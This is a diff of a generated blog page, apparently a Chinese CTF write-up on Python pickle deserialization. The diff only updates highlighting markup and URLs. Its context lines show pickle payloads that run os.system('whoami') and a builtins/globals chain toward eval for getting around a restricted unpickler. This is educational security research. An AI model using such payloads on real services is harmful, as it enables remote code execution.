@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>pickle - Theoyu</title>
 
 <meta name="description" content="">
-<link rel="canonical" href="http://localhost:4000/2021/pickle"><link rel="alternate" type="application/rss+xml" title="Theoyu" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+<link rel="canonical" href="https://theoyu.top/2021/pickle"><link rel="alternate" type="application/rss+xml" title="Theoyu" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
 
 <meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
 
@@ -607,9 +607,9 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 
 <p>毫无疑问又演变成沙盒了，在如今ctf越来越卷的情况下，限制条件也是越来越苛刻。从官方给的一个demo看看：</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">builtins</span>
-<span class="kn">import</span> <span class="nn">io</span>
-<span class="kn">import</span> <span class="nn">pickle</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">builtins</span>
+<span class="kn">import</span> <span class="n">io</span>
+<span class="kn">import</span> <span class="n">pickle</span>
 
 <span class="n">safe_builtins</span> <span class="o">=</span> <span class="p">{</span>
     <span class="s">'range'</span><span class="p">,</span>
@@ -621,25 +621,25 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 
 <span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="p">.</span><span class="n">Unpickler</span><span class="p">):</span>
 
-    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
         <span class="c1"># Only allow safe classes from builtins.
 </span>        <span class="k">if</span> <span class="n">module</span> <span class="o">==</span> <span class="s">"builtins"</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">safe_builtins</span><span class="p">:</span>
-            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+            <span class="k">return</span> <span class="nf">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
         <span class="c1"># Forbid everything else.
-</span>        <span class="k">raise</span> <span class="n">pickle</span><span class="p">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="s">"global '%s.%s' is forbidden"</span> <span class="o">%</span>
+</span>        <span class="k">raise</span> <span class="n">pickle</span><span class="p">.</span><span class="nc">UnpicklingError</span><span class="p">(</span><span class="s">"global '%s.%s' is forbidden"</span> <span class="o">%</span>
                                      <span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">restricted_loads</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
     <span class="s">"""Helper function analogous to pickle.loads()."""</span>
-    <span class="k">return</span> <span class="n">RestrictedUnpickler</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">s</span><span class="p">)).</span><span class="n">load</span><span class="p">()</span>
+    <span class="k">return</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nc">BytesIO</span><span class="p">(</span><span class="n">s</span><span class="p">)).</span><span class="nf">load</span><span class="p">()</span>
 
 <span class="n">test</span><span class="o">=</span> <span class="sa">b</span><span class="s">"cos</span><span class="se">\n</span><span class="s">system</span><span class="se">\n</span><span class="s">(S'echo hello world'</span><span class="se">\n</span><span class="s">tR."</span>
-<span class="n">restricted_loads</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
+<span class="nf">restricted_loads</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>其中这里重写了<code class="language-plaintext highlighter-rouge">find_class</code></p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210815152312.png" alt="image-20210815152312283" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210815152312.png" alt="image-20210815152312283" /></p>
 
 <p>对<strong>module</strong>限制为<strong>builtins</strong>,并且只允许<strong>safe_builtins</strong>。</p>
 
@@ -664,21 +664,21 @@ _pickle.UnpicklingError: global <span class="s1">'os.system'</span> is forbidden
   <li>存储区(memo)：将反序列化完成的数据以 <code class="language-plaintext highlighter-rouge">key-value</code> 的形式储存在memo中，以便后来使用。大多数情况，我们并不需要用到这个部分。</li>
 </ul>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210815155926.png" alt="" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210815155926.png" alt="" /></p>
 
 <p>Pickletools是一个利于我们反汇编pickle的工具，举一个例子看看</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pickletools</span>
-<span class="kn">import</span> <span class="nn">pickle</span>
-<span class="kn">import</span> <span class="nn">os</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">pickletools</span>
+<span class="kn">import</span> <span class="n">pickle</span>
+<span class="kn">import</span> <span class="n">os</span>
 
 <span class="k">class</span> <span class="nc">exp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
-    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,(</span><span class="s">'whoami'</span><span class="p">,))</span>
-<span class="n">e</span> <span class="o">=</span> <span class="n">exp</span><span class="p">()</span>
-<span class="n">s</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
-<span class="n">pickletools</span><span class="p">.</span><span class="n">dis</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="nf">return </span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,(</span><span class="s">'whoami'</span><span class="p">,))</span>
+<span class="n">e</span> <span class="o">=</span> <span class="nf">exp</span><span class="p">()</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
+<span class="n">pickletools</span><span class="p">.</span><span class="nf">dis</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>同时，<code class="language-plaintext highlighter-rouge">pickle.dumps</code>一共有6种形式，其中版本0最利于我们观察，越往后为了效率增加了很多字符，不过好在load是向前兼容的，所以我们后面的分析都采用版本0</p>
@@ -912,15 +912,15 @@ highest protocol among opcodes <span class="o">=</span> 0
 
 <p>结合语法来说的话，还是可以理解了，加上memo上的操作可以省略，简化为：</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="nn">pickle</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">pickle</span>
  
  <span class="n">a</span><span class="o">=</span><span class="s">'''cposix
  system
  (Vwhoami
  tR.'''</span>
  
- <span class="k">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
- <span class="n">pickle</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+ <span class="nf">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+ <span class="n">pickle</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
  
  <span class="c1">#theoyu
 </span></code></pre></div></div>
@@ -936,7 +936,7 @@ o.'''</span>
     <span class="mi">0</span><span class="p">:</span> <span class="p">(</span>    <span class="n">MARK</span>
     <span class="mi">1</span><span class="p">:</span> <span class="n">c</span>        <span class="n">GLOBAL</span>     <span class="s">'os system'</span>
    <span class="mi">12</span><span class="p">:</span> <span class="n">S</span>        <span class="n">STRING</span>     <span class="s">'whoami'</span>
-   <span class="mi">22</span><span class="p">:</span> <span class="n">o</span>        <span class="n">OBJ</span>        <span class="p">(</span><span class="n">MARK</span> <span class="n">at</span> <span class="mi">0</span><span class="p">)</span>
+   <span class="mi">22</span><span class="p">:</span> <span class="n">o</span>        <span class="nc">OBJ        </span><span class="p">(</span><span class="n">MARK</span> <span class="n">at</span> <span class="mi">0</span><span class="p">)</span>
    <span class="mi">23</span><span class="p">:</span> <span class="p">.</span>    <span class="n">STOP</span>
 
 
@@ -971,7 +971,7 @@ system
 <span class="p">(</span><span class="n">cbuiltins</span>
 <span class="nb">dict</span>
 <span class="n">S</span><span class="s">'get'</span>
-<span class="n">tR</span><span class="p">(</span><span class="n">cbuiltins</span>
+<span class="nf">tR</span><span class="p">(</span><span class="n">cbuiltins</span>
 <span class="nb">globals</span>
 <span class="p">(</span><span class="n">tRS</span><span class="s">'__builtins__'</span>   <span class="c1">#拿到bultins
 </span><span class="n">tRS</span><span class="s">'eval'</span>
@@ -1090,7 +1090,7 @@ return
   *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
   *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
   var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/2021/pickle';
+    this.page.url = 'https://theoyu.top/2021/pickle';
     this.page.identifier = 'pickle';
   };
   (function() { // DON'T EDIT BELOW THIS LINE
